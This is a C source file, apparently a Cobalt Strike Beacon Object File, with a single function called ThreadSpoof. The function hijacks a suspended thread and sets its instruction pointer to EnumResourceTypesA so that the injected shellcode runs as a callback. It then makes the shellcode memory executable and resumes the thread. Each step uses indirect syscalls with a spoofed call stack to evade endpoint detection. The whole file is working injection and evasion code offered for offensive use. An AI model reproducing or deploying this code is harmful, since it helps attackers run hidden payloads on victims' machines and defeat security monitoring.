#include <windows.h>

#include "Prototypes.h"
#include "Beacon.h"
#include "Vulcan.h"
#include "Ntdll.h"
#include "Macros.h"
#include "Bofdefs.h"
#include "Syscalls.h"

BOOL ThreadSpoof(
    _In_    HANDLE  hThread,
    _In_    HANDLE  hProcess,
    _In_    PVOID   pShellcode,
    _In_    SIZE_T  dwShellcodeSize,
	_In_	DWORD	dwOffset,
	_In_	PSYNTHETIC_STACK_FRAME	stackFrame,
	_In_	PNT_FUNC				ntFunc
)
{

    NTSTATUS    status      = 0; 
    CONTEXT     ctx         = { 0 };
    SIZE_T      oldProtect  = 0;

    ctx.ContextFlags        = CONTEXT_ALL;

    void* pEnumResourceTypesA = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "EnumResourceTypesA");
    if(!pEnumResourceTypesA)
    {
        BeaconPrintf(CALLBACK_ERROR, "[ThreadSpoof Error] 0x1 !");
        return FALSE;
    }

    status = SPOOF_CALL(stackFrame, ntFunc->NtGetContextThread.pJmpAddr, ntFunc->NtGetContextThread.wSyscall, hThread, &ctx);
	if(NT_ERROR(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[ThreadSpoof Error] 0x2 ! STATUS : 0x%llx", status);
		return FALSE;
	}

    ctx.Rip = U_PTR(pEnumResourceTypesA);
    ctx.Rcx = NULL;
    ctx.Rdx = (U_PTR(pShellcode) + dwOffset);

    status = SPOOF_CALL(stackFrame, ntFunc->NtSetContextThread.pJmpAddr, ntFunc->NtSetContextThread.wSyscall, hThread, &ctx);
	if(NT_ERROR(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[ThreadSpoof Error] 0x3 ! STATUS : 0x%llx", status);
		return FALSE;
	}

    status = SPOOF_CALL(stackFrame, ntFunc->NtProtectVirtualMemory.pJmpAddr, ntFunc->NtProtectVirtualMemory.wSyscall, hProcess, &pShellcode, &dwShellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
	if(status)
	{
		BeaconPrintf(CALLBACK_ERROR, "[EarlyBird Error] 0x4 ! STATUS : 0x%llx", status);
		return FALSE;
	}

    status = SPOOF_CALL(stackFrame, ntFunc->NtResumeThread.pJmpAddr, ntFunc->NtResumeThread.wSyscall, hThread, NULL);
	if(NT_ERROR(status))
	{
		BeaconPrintf(CALLBACK_ERROR, "[ThreadSpoof Error] 0x5 ! STATUS : 0x%llx", status);
		return FALSE;
	}

    
    return TRUE;
}